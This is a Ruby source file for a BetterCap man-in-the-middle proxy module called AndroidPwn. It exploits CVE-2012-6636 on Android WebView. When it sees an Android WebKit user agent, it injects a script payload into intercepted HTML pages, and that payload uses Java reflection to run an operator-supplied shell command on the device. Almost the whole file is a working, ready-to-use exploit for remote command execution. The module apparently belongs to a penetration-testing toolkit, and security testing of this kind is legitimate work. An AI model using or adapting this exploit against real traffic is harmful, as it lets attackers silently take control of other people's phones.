=begin

BETTERCAP

Author : Simone 'evilsocket' Margaritelli
Email  : evilsocket@gmail.com
Blog   : https://www.evilsocket.net/

This project is released under the GPL 3 license.

=end
class AndroidPwn < BetterCap::Proxy::HTTP::Module
  meta(
    'Name'        => 'AndroidPwn',
    'Description' => 'Exploits Android devices that are vulnerable to CVE-2012-6636 .',
    'Version'     => '1.0.0',
    'Author'      => "Simone 'evilsocket' Margaritelli",
    'License'     => 'GPL3'
  )

  @@command = nil
  @@payload = "<script>\n" +
              "var command = ['/system/bin/sh','-c','COMMAND_HERE'];\n" +
              "for(i in top) {\n" +
              " try {\n" +
              "   top[i].getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec(command);\n" +
              "   break;\n" +
              " }\n" +
              "catch(e) {}\n" +
              "}\n" +
              "</script>"

  def self.on_options(opts)
    opts.separator ""
    opts.separator "AndroidPwn Proxy Module Options:"
    opts.separator ""

    opts.on( '--command STRING', 'Shell command(s) to execute.' ) do |v|
      @@command = v.strip
      @@payload['COMMAND_HERE'] = @@command.gsub( "'", "\\\\'" )
    end
  end

  def initialize
    raise BetterCap::Error, "No --command option specified for the proxy module." if @@command.nil?
  end

  def on_request( request, response )
    if is_exploitable?( request, response )
      BetterCap::Logger.info ""
      BetterCap::Logger.info "Pwning Android Device :".red
      BetterCap::Logger.info "  URL    : http://#{request.host}#{request.path}"
      BetterCap::Logger.info "  AGENT  : #{request.headers['User-Agent']}"
      BetterCap::Logger.info ""

      response.body.sub!( '</head>', "</head>#{@@payload}" )
    end
  end

  private

  def is_exploitable?(req,res)
    req.headers.has_key?('User-Agent') and \
    req.headers['User-Agent'].include?("Android") and \
    req.headers['User-Agent'].include?("AppleWebKit") and \
    res.content_type =~ /^text\/html.*/ and \
    res.code == '200'
  end
end
